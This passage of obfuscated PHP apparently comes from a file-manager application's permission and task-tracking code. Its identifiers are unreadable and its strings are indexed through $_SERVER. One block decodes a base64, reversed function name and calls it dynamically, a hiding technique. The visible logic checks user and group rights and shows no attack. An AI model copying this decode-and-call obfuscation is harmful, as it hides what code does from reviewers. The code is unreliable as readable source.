= array(); if ($íèÄ¢Ä) { $À›˜¦ĞÓ = $áş¶á’ª->where(array($É¼ó²„[402] => array($É¼ó²„[418], $íèÄ¢Ä)))->select(); foreach ($À›˜¦ĞÓ as $ãÈ¹¢êÖ) { $Ó¢Şü“ = $áş¶á’ª->parentLevelArray($ãÈ¹¢êÖ[$É¼ó²„[521]]); $²µ¼ß‘ = array_merge($²µ¼ß‘, $Ó¢Şü“); $“Ä¾Ëë¿[] = $ãÈ¹¢êÖ[$É¼ó²„[505]]; $ßêá–Õ¬[$ãÈ¹¢êÖ[$É¼ó²„[402]]] = $Ó¢Şü“; $³Ñ”åçı[$ãÈ¹¢êÖ[$É¼ó²„[402]]] = $ãÈ¹¢êÖ[$É¼ó²„[505]]; } } $“Ä¾Ëë¿ = array_values(array_unique($“Ä¾Ëë¿)); $ÑÔøÓ‡¬ = $“Ä¾Ëë¿; foreach ($ÑÔøÓ‡¬ as $ˆ¶ØáŞ¯) { $™±ÁÙö = $™„½şìÙ->getInfo($ˆ¶ØáŞ¯); $Ó¢Şü“ = $áş¶á’ª->parentLevelArray($™±ÁÙö[$É¼ó²„[521]]); $“Ä¾Ëë¿ = array_merge($“Ä¾Ëë¿, $Ó¢Şü“); } $“Ä¾Ëë¿ = array_values(array_unique($“Ä¾Ëë¿)); foreach ($“Ä¾Ëë¿ as $ˆ¶ØáŞ¯) { $™±ÁÙö = $™„½şìÙ->getInfo($ˆ¶ØáŞ¯); $²µ¼ß‘[] = $™±ÁÙö[$É¼ó²„[86]][$É¼ó²„[402]]; $€¼ï—³[$ˆ¶ØáŞ¯] = $™±ÁÙö[$É¼ó²„[86]][$É¼ó²„[402]]; $şÔ÷ôÄÔ[$ˆ¶ØáŞ¯] = $áş¶á’ª->parentLevelArray($™±ÁÙö[$É¼ó²„[521]]); } foreach ($ßêá–Õ¬ as $Ü‰Åîğ¯ => $´€ö„ÖÆ) { $Âù‰¼‘ = $³Ñ”åçı[$Ü‰Åîğ¯]; if (!$Âù‰¼‘ || !$€¼ï—³[$Âù‰¼‘]) { continue; } $¡ÄŠ˜‘ = array(); foreach ($şÔ÷ôÄÔ[$Âù‰¼‘] as $ˆ¶ØáŞ¯) { $¡ÄŠ˜‘[] = $€¼ï—³[$ˆ¶ØáŞ¯]; } $ßêá–Õ¬[$Ü‰Åîğ¯] = array_merge($¡ÄŠ˜‘, $´€ö„ÖÆ); } $²µ¼ß‘ = array_values(array_unique($²µ¼ß‘)); $ÙĞµ¹½Š = array($É¼ó²„[2045] => $²µ¼ß‘, $É¼ó²„[2046] => $ßêá–Õ¬); $…á°¹”[$‹¦±ÆäÎ] = $ÙĞµ¹½Š; return $ÙĞµ¹½Š; } private function makeSourceAuth($ÀçÈå€›, $½¤õÉõ, $µØš¾˜ = false) { $Å€ÓŒİ =& $_SERVER[ùÆÎÔ“Ñ]; $Û¸Èªß› = $Å€ÓŒİ[88]; $¯îß²ùš = $ÀçÈå€›[$Å€ÓŒİ[505]]; $ìƒ…Éã = $ÀçÈå€›[$Å€ÓŒİ[411]] == SourceModel::TYPE_GROUP; $¨ŠªŸÕ½ = $ìƒ…Éã ? $this->groupRootAuth($¯îß²ùš, $µØš¾˜) : !1; if ($¨ŠªŸÕ½ && Model($Å€ÓŒİ[507])->authCheckAction($¨ŠªŸÕ½[$Å€ÓŒİ[413]], $Å€ÓŒİ[1878])) { return $this->groupAuthInfo($¨ŠªŸÕ½, $¯îß²ùš); } $„³‹ö¦ = Model($Å€ÓŒİ[1341])->parentLevelArray($ÀçÈå€›[$Å€ÓŒİ[521]]); $„³‹ö¦ = array_merge(array($ÀçÈå€›[$Å€ÓŒİ[402]]), array_reverse($„³‹ö¦)); $À’ŒƒÙµ = !1; foreach ($„³‹ö¦ as $Õê‚øşè) { if (!isset($½¤õÉõ[$Õê‚øşè])) { continue; } $ˆÍĞÎÍô = $this->authMake($½¤õÉõ[$Õê‚øşè], $µØš¾˜); if ($ˆÍĞÎÍô[$Å€ÓŒİ[467]]) { $À’ŒƒÙµ = $ˆÍĞÎÍô; break; } } if (!$ìƒ…Éã) { return $À’ŒƒÙµ; } if (!$À’ŒƒÙµ && $¨ŠªŸÕ½) { $À’ŒƒÙµ = $this->groupAuthInfo($¨ŠªŸÕ½, $¯îß²ùš); } if (!$À’ŒƒÙµ) { $ôíœÉĞ = Model($Å€ÓŒİ[522])->getInfo($¯îß²ùš); $İü­àˆ = explode($Å€ÓŒİ[50], trim($ôíœÉĞ[$Å€ÓŒİ[521]], $Å€ÓŒİ[50])); $İü­àˆ = array_reverse($İü­àˆ); foreach ($İü­àˆ as $«ã¡İ½ˆ) { if ($«ã¡İ½ˆ == $Å€ÓŒİ[197] || $«ã¡İ½ˆ == $Û¸Èªß›) { continue; } $Ş²‡•íŞ = $this->groupRootAuth($«ã¡İ½ˆ, $µØš¾˜); if (!$Ş²‡•íŞ) { continue; } $À’ŒƒÙµ = $this->groupAuthInfo($Ş²‡•íŞ, $«ã¡İ½ˆ); break; } } if (!$À’ŒƒÙµ || $À’ŒƒÙµ[$Å€ÓŒİ[414]] <= 0) { $şê—»©ñ = $this->authDeepCheck($ÀçÈå€›[$Å€ÓŒİ[402]], $µØš¾˜); if ($şê—»©ñ) { $À’ŒƒÙµ = $şê—»©ñ; } } return $À’ŒƒÙµ; } private function userIsRoot($÷Â¨Ïê§ = false) { $ğåÚïœã =& $_SERVER[ùÆÎÔ“Ñ]; if (!$÷Â¨Ïê§ && _get($GLOBALS, $ğåÚïœã[503])) { return !0; } $Ããİ»Ç‡ = Model($ğåÚïœã[535])->getInfo($÷Â¨Ïê§); $Åé‡‘ãŸ = Model($ğåÚïœã[2054])->listData($Ããİ»Ç‡[$ğåÚïœã[1548]]); if ($Åé‡‘ãŸ && $Åé‡‘ãŸ[$ğåÚïœã[511]][$ğåÚïœã[2055]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ñ°ÊÎÜû) { $¬‘ôõú¤ =& $_SERVER[ùÆÎÔ“Ñ]; $Æ­‚ÅÕ³ = Model($¬‘ôõú¤[1341]); $àª¢ìƒ = $Æ­‚ÅÕ³->sourceInfo($Ñ°ÊÎÜû); if (!$àª¢ìƒ) { return !1; } $Æ­‚ÅÕ³->groupPathDisplay($àª¢ìƒ); $ ¿—… = array($àª¢ìƒ); $ ¿—… = $Æ­‚ÅÕ³->_listAppendPath($ ¿—…); $àª¢ìƒ = $ ¿—…[0]; $ë«ŞÏüë = $àª¢ìƒ[$¬‘ôõú¤[519]]; if (isset($àª¢ìƒ[$¬‘ôõú¤[527]])) { $²ØñƒÇ = explode($¬‘ôõú¤[8], trim($àª¢ìƒ[$¬‘ôõú¤[519]], $¬‘ôõú¤[8])); array_shift($²ØñƒÇ); $ë«ŞÏüë = $àª¢ìƒ[$¬‘ôõú¤[525]] . $¬‘ôõú¤[2056] . implode($¬‘ôõú¤[8], $²ØñƒÇ); } return array($¬‘ôõú¤[420] => $àª¢ìƒ[$¬‘ôõú¤[32]], $¬‘ôõú¤[84] => KodIO::make($àª¢ìƒ[$¬‘ôõú¤[402]]), $¬‘ôõú¤[2057] => $ë«ŞÏüë); } private function groupAuthInfo($ÙÅ×îı×, $‰”õÉÁ) { $¬‰áÕ°ø =& $_SERVER[ùÆÎÔ“Ñ]; $¨ÛÌ®‚ = Model($¬‰áÕ°ø[522])->getInfo($‰”õÉÁ); return array($¬‰áÕ°ø[2058] => intval($ÙÅ×îı×[$¬‰áÕ°ø[413]]), $¬‰áÕ°ø[2042] => $ÙÅ×îı×, $¬‰áÕ°ø[2059] => LNG($¬‰áÕ°ø[2060]), $¬‰áÕ°ø[2051] => array($¬‰áÕ°ø[420] => $¨ÛÌ®‚[$¬‰áÕ°ø[32]], $¬‰áÕ°ø[84] => KodIO::make($¨ÛÌ®‚[$¬‰áÕ°ø[86]][$¬‰áÕ°ø[402]]), $¬‰áÕ°ø[2057] => $¨ÛÌ®‚[$¬‰áÕ°ø[526]])); } protected function groupRootAuth($•İ‹Á¸¶, $„ÀğêÕò = false) { $ªğŸôş =& $_SERVER[ùÆÎÔ“Ñ]; $„ÀğêÕò = $„ÀğêÕò ? $„ÀğêÕò : USER_ID; $£Œ­ñ = $„ÀğêÕò . $ªğŸôş[2061] . $•İ‹Á¸¶; static $ƒ¸¤òÛ€ = array(); if (isset($ƒ¸¤òÛ€[$£Œ­ñ])) { return $ƒ¸¤òÛ€[$£Œ­ñ]; } $Øù†ç = Model($ªğŸôş[522])->getInfo($•İ‹Á¸¶); $ôĞ¯³¼² = $this->userGroupList($„ÀğêÕò); $Øòº°¸â = isset($ôĞ¯³¼²[$•İ‹Á¸¶]) ? $ôĞ¯³¼²[$•İ‹Á¸¶][$ªğŸôş[413]] : !1; if ($Øòº°¸â && Model($ªğŸôş[507])->authCheckAction($Øòº°¸â[$ªğŸôş[413]], $ªğŸôş[1878])) { $ƒ¸¤òÛ€[$£Œ­ñ] = $Øòº°¸â; return $Øòº°¸â; } $ºÜİ»Çà = $this->sourceAuthSelect($Øù†ç[$ªğŸôş[86]][$ªğŸôş[402]]); $ô÷û€áâ = $ºÜİ»Çà ? $this->authMake($ºÜİ»Çà, $„ÀğêÕò) : !1; $ğ®ÂÚË© = $ô÷û€áâ ? $ô÷û€áâ[$ªğŸôş[467]] : !1; $ƒ¸¤òÛ€[$£Œ­ñ] = $ğ®ÂÚË© ? $ğ®ÂÚË© : $Øòº°¸â; return $ƒ¸¤òÛ€[$£Œ­ñ]; } public function authOwnerApply($¢ì†í†) { $ùà„ü¼á =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($¢ì†í†[$ùà„ü¼á[413]]) || isset($¢ì†í†[$ùà„ü¼á[2062]]) && $¢ì†í†[$ùà„ü¼á[2062]]) { return $¢ì†í†; } if (AuthModel::authCheckRoot($¢ì†í†[$ùà„ü¼á[413]][$ùà„ü¼á[414]])) { return $¢ì†í†; } $·¨±¼Ú = Model($ùà„ü¼á[1341])->parentLevelArray($¢ì†í†[$ùà„ü¼á[521]]); $·¨±¼Ú = array_merge(array($¢ì†í†[$ùà„ü¼á[402]]), array_reverse($·¨±¼Ú)); $ö®•°Ğü = $this->sourceAuthSelect($·¨±¼Ú); $è±’Ü£• = array(); $«Åíı¸ = array(); foreach ($ö®•°Ğü as $Ç³š¡×¢ => $Ì¶ Ôµ) { $ùÃßø† = $this->authFolderOwnerUser($Ì¶ Ôµ); $è±’Ü£•[$Ç³š¡×¢] = $ùÃßø†; $«Åíı¸ = array_merge($«Åíı¸, $ùÃßø†[$ùà„ü¼á[600]]); if ($ùÃßø†[$ùà„ü¼á[2063]]) { break; } } if (count($«Åíı¸) == 0) { $«Åíı¸ = $this->authFolderOwnerGroup($¢ì†í†[$ùà„ü¼á[505]]); } $«Åíı¸ = array_unique($«Åíı¸); if (AuthModel::authCheckRoot($¢ì†í†[$ùà„ü¼á[413]][$ùà„ü¼á[414]])) { $«Åíı¸[] = USER_ID; } $¢ì†í†[$ùà„ü¼á[413]][$ùà„ü¼á[2064]] = Model($ùà„ü¼á[513])->userListInfo($«Åíı¸); return $¢ì†í†; } private function authFolderOwnerGroup($ıÅš×û) { $Öœ¹äƒù =& $_SERVER[ùÆÎÔ“Ñ]; $Š´“ü© = Model($Öœ¹äƒù[1947])->where(array($Öœ¹äƒù[1857] => $ıÅš×û))->select(); $Ü ëÏÏ = array(); if (!$Š´“ü©) { return $Ü ëÏÏ; } foreach ($Š´“ü© as $ŸñÛ¥‹¢) { $ÚªìÓ‚„ = $this->authInfo($ŸñÛ¥‹¢); if (AuthModel::authCheckRoot($ÚªìÓ‚„[$Öœ¹äƒù[413]])) { $Ü ëÏÏ[] = $ŸñÛ¥‹¢[$Öœ¹äƒù[1667]]; } } return $Ü ëÏÏ; } private function authFolderOwnerUser($ÊğÙ­éí) { $»¥öÅ‘á =& $_SERVER[ùÆÎÔ“Ñ]; $£Ùíâó = array(); $·ÍÙ»Ñ˜ = !1; foreach ($ÊğÙ­éí as $ÉÚ…ŒÙ) { $€§®»›Î = $this->authInfo($ÉÚ…ŒÙ); if ($ÉÚ…ŒÙ[$»¥öÅ‘á[505]] == $»¥öÅ‘á[197]) { $·ÍÙ»Ñ˜ = !0; } if ($ÉÚ…ŒÙ[$»¥öÅ‘á[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($€§®»›Î[$»¥öÅ‘á[413]])) { $£Ùíâó[] = $ÉÚ…ŒÙ[$»¥öÅ‘á[505]]; } } } return array($»¥öÅ‘á[600] => $£Ùíâó, $»¥öÅ‘á[2063] => $·ÍÙ»Ñ˜); } public function authMake($áßì¥à, $Ñ€¢ûÙ™ = false) { $…óµÃ =& $_SERVER[ùÆÎÔ“Ñ]; $µÅØˆ = $this->authArrayCheck($áßì¥à, $Ñ€¢ûÙ™); if ($µÅØˆ[$…óµÃ[2065]]) { $µÅØˆ[$…óµÃ[2065]] = $this->sourceAuthInfo($µÅØˆ[$…óµÃ[2065]]); } return $µÅØˆ; } public function authArrayCheck($¨¤˜î¼, $Ğµ×íß— = false) { $¹ŞÂ û =& $_SERVER[ùÆÎÔ“Ñ]; if (!$¨¤˜î¼) { return array($¹ŞÂ û[414] => 0, $¹ŞÂ û[467] => !1); } $Ğµ×íß— = $Ğµ×íß— ? $Ğµ×íß— : USER_ID; $Æ±©Ö–³ = 0; $Ïòáëé = 0; $‹‡ÈĞÌ = 0; $çëÔ¯ĞÍ = 0; $ˆ•„ˆ = 0; $å°‘—ÎÕ = 0; $–ÃÓµè = 1000; $ó˜èçßø = 0; $½œ‡—Õ = 0; $ÁøŸÁ· = 0; $¦ï×•š = 0; $¤Ãã¶ï = array($¹ŞÂ û[402] => 0); foreach ($¨¤˜î¼ as $¤Ãã¶ï) { $†š»¬‡ = $this->authInfo($¤Ãã¶ï); if (!$†š»¬‡) { continue; } $İ‚·çÙ„ = $¤Ãã¶ï[$¹ŞÂ û[505]]; $Ÿºè»íû = intval($†š»¬‡[$¹ŞÂ û[413]]); if ($¤Ãã¶ï[$¹ŞÂ û[411]] == SourceModel::TYPE_USER && $İ‚·çÙ„ == $Ğµ×íß—) { $Æ±©Ö–³ = !0; $‹‡ÈĞÌ = $†š»¬‡; $Ïòáëé = $Ÿºè»íû; } else { if ($¤Ãã¶ï[$¹ŞÂ û[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($İ‚·çÙ„, $Ğµ×íß—)) { $çëÔ¯ĞÍ = !0; $ÉŒââ˜® = $this->groupStepToUserGroup($İ‚·çÙ„, $Ğµ×íß—); if ($ÉŒââ˜® < $–ÃÓµè) { $–ÃÓµè = $ÉŒââ˜®; $ˆ•„ˆ = $Ÿºè»íû; $å°‘—ÎÕ = $†š»¬‡; $ó˜èçßø = $İ‚·çÙ„; } if ($ÉŒââ˜® == $–ÃÓµè && $Ÿºè»íû >= $ˆ•„ˆ) { $ˆ•„ˆ = $Ÿºè»íû; $å°‘—ÎÕ = $†š»¬‡; $ó˜èçßø = $İ‚·çÙ„; } } else { if ($İ‚·çÙ„ == $¹ŞÂ û[197]) { $½œ‡—Õ = !0; $¦ï×•š = $†š»¬‡; $ÁøŸÁ· = $Ÿºè»íû; } } } } if ($Æ±©Ö–³) { $ó»Æßä = $Ïòáëé; $†š»¬‡ = $‹‡ÈĞÌ; $¦†æÜ‚Ô = LNG($¹ŞÂ û[2066]); } else { if ($çëÔ¯ĞÍ) { $ó»Æßä = $ˆ•„ˆ; $†š»¬‡ = $å°‘—ÎÕ; $’İ¯Âå¯ = Model($¹ŞÂ û[522])->getInfo($ó˜èçßø); $¦†æÜ‚Ô = $¹ŞÂ û[162] . $’İ¯Âå¯[$¹ŞÂ û[526]] . $¹ŞÂ û[2067] . LNG($¹ŞÂ û[2068]); } else { if ($½œ‡—Õ) { $ó»Æßä = $ÁøŸÁ·; $†š»¬‡ = $¦ï×•š; $¦†æÜ‚Ô = LNG($¹ŞÂ û[2039]); } else { $ó»Æßä = 0; $†š»¬‡ = !1; $¦†æÜ‚Ô = $¹ŞÂ û[12]; } } } $£Á÷àóá = array($¹ŞÂ û[2058] => intval($ó»Æßä), $¹ŞÂ û[2042] => $†š»¬‡, $¹ŞÂ û[2059] => $¦†æÜ‚Ô, $¹ŞÂ û[2051] => $¤Ãã¶ï[$¹ŞÂ û[402]]); return $£Á÷àóá; } private function groupContainUser($ôº°ÛŸ‹, $Å¼ŒıÍˆ = false) { return in_array($ôº°ÛŸ‹, $this->userGroupParents($Å¼ŒıÍˆ)); } private function groupStepToUserGroup($—Üç—ûß, $êÛ²ŸĞà = false) { $äÒâ¡ó =& $_SERVER[ùÆÎÔ“Ñ]; $íï“â = $this->userGroupList($êÛ²ŸĞà); $³Š°ï­Ä = 1000; $°£ı¶Ë÷ = $GLOBALS[$äÒâ¡ó[6]][$äÒâ¡ó[89]][$äÒâ¡ó[1960]] == 1; $Òé£ÈÎ¤ = $°£ı¶Ë÷ ? 3 : 2; foreach ($íï“â as $ıÅåµÍ) { if ($ıÅåµÍ[$äÒâ¡ó[1857]] == $—Üç—ûß) { return 0; } $³²°§Ó = explode($äÒâ¡ó[50], trim($ıÅåµÍ[$äÒâ¡ó[521]], $äÒâ¡ó[50])); if ($³²°§Ó[0] == $äÒâ¡ó[197] && count($³²°§Ó) > $Òé£ÈÎ¤) { $ô—ëªŞ = array_reverse(array_slice($³²°§Ó, $Òé£ÈÎ¤)); $¨Á¢ßÆÒ = array_search($—Üç—ûß, $ô—ëªŞ); if ($¨Á¢ßÆÒ !== !1 && $¨Á¢ßÆÒ + 1 <= $³Š°ï­Ä) { $³Š°ï­Ä = $¨Á¢ßÆÒ + 1; } } } return $³Š°ï­Ä; } private function userGroupList($«ÍâË˜ = false) { $ó£ïíÂÇ =& $_SERVER[ùÆÎÔ“Ñ]; static $ÊúĞ»àí = array(); if (isset($ÊúĞ»àí[$«ÍâË˜])) { return $ÊúĞ»àí[$«ÍâË˜]; } $½Ü‰†•ò = Model($ó£ïíÂÇ[535])->getInfo($«ÍâË˜); $ÊúĞ»àí[$«ÍâË˜] = array_to_keyvalue($½Ü‰†•ò[$ó£ïíÂÇ[2040]], $ó£ïíÂÇ[1857]); return $ÊúĞ»àí[$«ÍâË˜]; } public function userGroupParents($Ö›¯ËÓ„) { $–¢Êåà =& $_SERVER[ùÆÎÔ“Ñ]; static $šˆÉ“ÒÏ = array(); $Ö›¯ËÓ„ = $Ö›¯ËÓ„ ? $Ö›¯ËÓ„ : USER_ID; if (isset($šˆÉ“ÒÏ[$Ö›¯ËÓ„])) { return $šˆÉ“ÒÏ[$Ö›¯ËÓ„]; } $ˆ´É¼¹û = $this->userGroupList($Ö›¯ËÓ„); $¬ŒùÈóÈ = array(); $Ù¹ÛÖ»ß = $GLOBALS[$–¢Êåà[6]][$–¢Êåà[89]][$–¢Êåà[1960]] == 1; $‘Ïİ›¡“ = $Ù¹ÛÖ»ß ? 3 : 2; foreach ($ˆ´É¼¹û as $«ƒá°ß‡) { $ì·î÷Ğ = array($«ƒá°ß‡[$–¢Êåà[1857]]); $óü·¾„° = explode($–¢Êåà[50], trim($«ƒá°ß‡[$–¢Êåà[521]], $–¢Êåà[50])); if ($óü·¾„°[0] == $–¢Êåà[197] && count($óü·¾„°) > $‘Ïİ›¡“) { $…ºíÕö = array_slice($óü·¾„°, $‘Ïİ›¡“); $ì·î÷Ğ = array_merge($ì·î÷Ğ, array_reverse($…ºíÕö)); } $¬ŒùÈóÈ = array_merge($¬ŒùÈóÈ, $ì·î÷Ğ); } $šˆÉ“ÒÏ[$Ö›¯ËÓ„] = array_unique($¬ŒùÈóÈ); return $šˆÉ“ÒÏ[$Ö›¯ËÓ„]; } public function authTargetInfoMake($¤‚—‰Ó±) { $ìô‡Û©ô =& $_SERVER[ùÆÎÔ“Ñ]; $óàßÛù¤ = array(); $Ñ¾‘öáƒ = array(); foreach ($¤‚—‰Ó± as $ú¶¡ äƒ) { if ($ú¶¡ äƒ[$ìô‡Û©ô[411]] == SourceModel::TYPE_USER) { $óàßÛù¤[] = intval($ú¶¡ äƒ[$ìô‡Û©ô[505]]); } else { if ($ú¶¡ äƒ[$ìô‡Û©ô[411]] == SourceModel::TYPE_GROUP) { $Ñ¾‘öáƒ[] = intval($ú¶¡ äƒ[$ìô‡Û©ô[505]]); } } } if ($óàßÛù¤) { $óàßÛù¤ = Model($ìô‡Û©ô[513])->userListInfo($óàßÛù¤); } if ($Ñ¾‘öáƒ) { $Â¨»  = array($ìô‡Û©ô[1945] => array($ìô‡Û©ô[418], $Ñ¾‘öáƒ)); $Ñ¾‘öáƒ = Model($ìô‡Û©ô[522])->field($ìô‡Û©ô[2069])->where($Â¨» )->select(); $Ñ¾‘öáƒ = array_to_keyvalue($Ñ¾‘öáƒ, $ìô‡Û©ô[1857]); } return array($ìô‡Û©ô[2070] => $óàßÛù¤, $ìô‡Û©ô[2071] => $Ñ¾‘öáƒ); } public function authInfo($’„¤ÙÈ§) { $ˆî‹—§¬ =& $_SERVER[ùÆÎÔ“Ñ]; if ($’„¤ÙÈ§[$ˆî‹—§¬[1961]]) { $ß‰ê£¸‘ = Model($ˆî‹—§¬[507])->listData($’„¤ÙÈ§[$ˆî‹—§¬[1961]]); if (!$ß‰ê£¸‘) { return !1; $Ì¼å¼– = Model($ˆî‹—§¬[507])->listData(); $á€ µ÷î = array_filter_by_field($Ì¼å¼–, $ˆî‹—§¬[413], $ˆî‹—§¬[197]); return $á€ µ÷î; } $à¦¨ºá = array_field_key($ß‰ê£¸‘, array($ˆî‹—§¬[399], $ˆî‹—§¬[32], $ˆî‹—§¬[413], $ˆî‹—§¬[1880], $ˆî‹—§¬[1881])); $à¦¨ºá[$ˆî‹—§¬[2072]] = $’„¤ÙÈ§; return $à¦¨ºá; } else { return array($ˆî‹—§¬[419] => 0, $ˆî‹—§¬[1863] => $’„¤ÙÈ§[$ˆî‹—§¬[2017]], $ˆî‹—§¬[420] => $ˆî‹—§¬[12], $ˆî‹—§¬[1880] => $ˆî‹—§¬[2073]); } } } goto C®ö•‰–ê¨; DÆ“‰ÀË…: $fileSize = strrev(base64_decode($_SERVER[„Ú¢¸Ô«][0])); function binCheckNeq($›‘²‡ù, $áöÓÇ–) { return $›‘²‡ù != $áöÓÇ–; } $_SERVER[$_SERVER[„Ú¢¸Ô«][1]] = $fileSize($_SERVER[$_SERVER[„Ú¢¸Ô«][2]]); goto a½à”Æ‹¸÷; DÇ½…”İ…: class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($é±µÆÈß, $Œ´äà = '', $ùë®Ëô¾ = 0, $Ò€²´°¸ = '') { $áØ¸ïëë =& $_SERVER[ùÆÎÔ“Ñ]; if (self::get($é±µÆÈß)) { return; } $Ö—å¹øò = defined($áØ¸ïëë[475]) ? USER_ID : $áØ¸ïëë[197]; $this->task = array($áØ¸ïëë[399] => $é±µÆÈß, $áØ¸ïëë[1667] => $Ö—å¹øò, $áØ¸ïëë[1567] => $Ò€²´°¸, $áØ¸ïëë[453] => $áØ¸ïëë[12], $áØ¸ïëë[33] => $Œ´äà, $áØ¸ïëë[1069] => $áØ¸ïëë[12], $áØ¸ïëë[787] => $ùë®Ëô¾, $áØ¸ïëë[1668] => 0, $áØ¸ïëë[1669] => 0, $áØ¸ïëë[1670] => 0, $áØ¸ïëë[1671] => timeFloat(), $áØ¸ïëë[1672] => 0, $áØ¸ïëë[1673] => 0, $áØ¸ïëë[1674] => 0, $áØ¸ïëë[1675] => 0, $áØ¸ïëë[751] => $áØ¸ïëë[1626]); $GLOBALS[$áØ¸ïëë[1676]] = 1; Hook::bind($áØ¸ïëë[1631], array($this, $áØ¸ïëë[1677])); Hook::bind($áØ¸ïëë[1678], array($this, $áØ¸ïëë[1679])); $this->startAfter(); Hook::trigger($áØ¸ïëë[1680], $this->task); $this->task[$áØ¸ïëë[1673]] = timeFloat(); } public function end($èÀÁÅ”â = '') { $µ‘ÙåÌ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$µ‘ÙåÌ[1673]]) { self::valueSet($this->task[$µ‘ÙåÌ[399]], !1); } $this->isEnd = !0; if ($èÀÁÅ”â) { $this->task[$µ‘ÙåÌ[453]] = $èÀÁÅ”â; } self::log($µ‘ÙåÌ[1681] . $this->task[$µ‘ÙåÌ[399]] . $µ‘ÙåÌ[1682] . sprintf($µ‘ÙåÌ[1683], timeFloat() - $this->task[$µ‘ÙåÌ[1671]]) . $µ‘ÙåÌ[1684]); Hook::unbind($µ‘ÙåÌ[1631], array($this, $µ‘ÙåÌ[1677])); Hook::unbind($µ‘ÙåÌ[1678], array($this, $µ‘ÙåÌ[1679])); $this->endAfter(); $ÒìÊÒÏ = $this->task; $this->task = !1; Hook::trigger($µ‘ÙåÌ[1685], $ÒìÊÒÏ); } public function update($™Šä†Î• = 0, $›ÜÅ¸Şî = false) { $óÎíô =& $_SERVER[ùÆÎÔ“Ñ]; $ûÃÕûĞ· =& $this->task; if (!$ûÃÕûĞ·) { return; } $ûÃÕûĞ·[$óÎíô[1668]] += $™Šä†Î•; $ûÃÕûĞ·[$óÎíô[1672]] = timeFloat(); if ($ûÃÕûĞ·[$óÎíô[787]]) { if ($ûÃÕûĞ·[$óÎíô[787]] < $ûÃÕûĞ·[$óÎíô[1668]]) { $ûÃÕûĞ·[$óÎíô[787]] = $ûÃÕûĞ·[$óÎíô[1668]]; } $‰¦æÁ¢¹ = timeFloat() - $ûÃÕûĞ·[$óÎíô[1671]] - $ûÃÕûĞ·[$óÎíô[1674]]; if ($‰¦æÁ¢¹ <= 0) { $‰¦æÁ¢¹ = 0.001; } $ûÃÕûĞ·[$óÎíô[1669]] = $ûÃÕûĞ·[$óÎíô[1668]] / $ûÃÕûĞ·[$óÎíô[787]]; $ûÃÕûĞ·[$óÎíô[1670]] = $ûÃÕûĞ·[$óÎíô[1668]] / $‰¦æÁ¢¹; if ($ûÃÕûĞ·[$óÎíô[1669]] > 0) { $ûÃÕûĞ·[$óÎíô[1675]] = $‰¦æÁ¢¹ * (1 - $ûÃÕûĞ·[$óÎíô[1669]]) / $ûÃÕûĞ·[$óÎíô[1669]]; } $ûÃÕûĞ·[$óÎíô[1675]] = $ûÃÕûĞ·[$óÎíô[1675]] <= 0 ? 0 : $ûÃÕûĞ·[$óÎíô[1675]]; } $this->updateAfter(); $†ƒó¶ï™ = 0.2; if (timeFloat() - $ûÃÕûĞ·[$óÎíô[1673]] < $†ƒó¶ï™ && !$›ÜÅ¸Şî) { return; } $¯ıÎÍ¤ = self::get($ûÃÕûĞ·[$óÎíô[399]]); $»Èù‚şÆ = $¯ıÎÍ¤[$óÎíô[751]]; if ($»Èù‚şÆ == self::STATYS_KILL) { $Ò”¯‡Ğû = array($óÎíô[1686] => LNG($óÎíô[1687]), $óÎíô[1218] => !1); Cache::set($óÎíô[1688] . $this->task[$óÎíô[399]], $Ò”¯‡Ğû, 30); $this->onKill(); $this->end(); die; } else { if ($»Èù‚şÆ == self::STATYS_STOP) { $—Šİ™‹Ì = 2; $¯ıÎÍ¤[$óÎíô[1674]] += $—Šİ™‹Ì; self::valueSet($ûÃÕûĞ·[$óÎíô[399]], $¯ıÎÍ¤); sleep($—Šİ™‹Ì); $this->update(); return; } } $ûÃÕûĞ·[$óÎíô[751]] = $»Èù‚şÆ ? $»Èù‚şÆ : $ûÃÕûĞ·[$óÎíô[751]]; $ûÃÕûĞ·[$óÎíô[1674]] = $¯ıÎÍ¤[$óÎíô[1674]] ? $¯ıÎÍ¤[$óÎíô[1674]] : 0; $ûÃÕûĞ·[$óÎíô[1673]] = timeFloat(); Hook::trigger($óÎíô[1689], $ûÃÕûĞ·); self::valueSet($ûÃÕûĞ·[$óÎíô[399]], $ûÃÕûĞ·); } public function onKillSet($…ÖÉĞÀª, $ü½ğ½òô = array()) { $this->onKillCall = array($…ÖÉĞÀª, $ü½ğ½òô); } public function onKill() { $ÀÇ°¯­  =& $_SERVER[ùÆÎÔ“Ñ]; self::log($ÀÇ°¯­ [1681] . $this->task[$ÀÇ°¯­ [399]] . $ÀÇ°¯­ [1690]); Hook::trigger($ÀÇ°¯­ [1691], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($öğ¾Ëôé) { $á˜´¿î÷ =& $_SERVER[ùÆÎÔ“Ñ]; Cache::set($á˜´¿î÷[1688] . $this->task[$á˜´¿î÷[399]], $öğ¾Ëôé, 60); return $öğ¾Ëôé; } public static function get($Ï÷ÓÔÒ³) { $ú˜‚ÇÍã =& $_SERVER[ùÆÎÔ“Ñ]; $³¶¬Îäâ = self::valueGet($Ï÷ÓÔÒ³); if (is_array($³¶¬Îäâ) && $³¶¬Îäâ[$ú˜‚ÇÍã[1692]]) { $áéç›¢ƒ = ActionApply($³¶¬Îäâ[$ú˜‚ÇÍã[1692]], array($³¶¬Îäâ)); $³¶¬Îäâ = is_array($áéç›¢ƒ) ? $áéç›¢ƒ : $³¶¬Îäâ; } return $³¶¬Îäâ; } public static function listData() { $ó¨Ãı‹á = self::valueGet(); return array_sort_by($ó¨Ãı‹á, $_SERVER[ùÆÎÔ“Ñ][1671], !0); } public static function kill($ÙÄ¥¢Õ…) { return self::changeStatus($ÙÄ¥¢Õ…, self::STATYS_KILL); } public static function stop($ªÀ•‘Á) { return self::changeStatus($ªÀ•‘Á, self::STATYS_STOP); } public static function restart($ß¢Ü™) { return 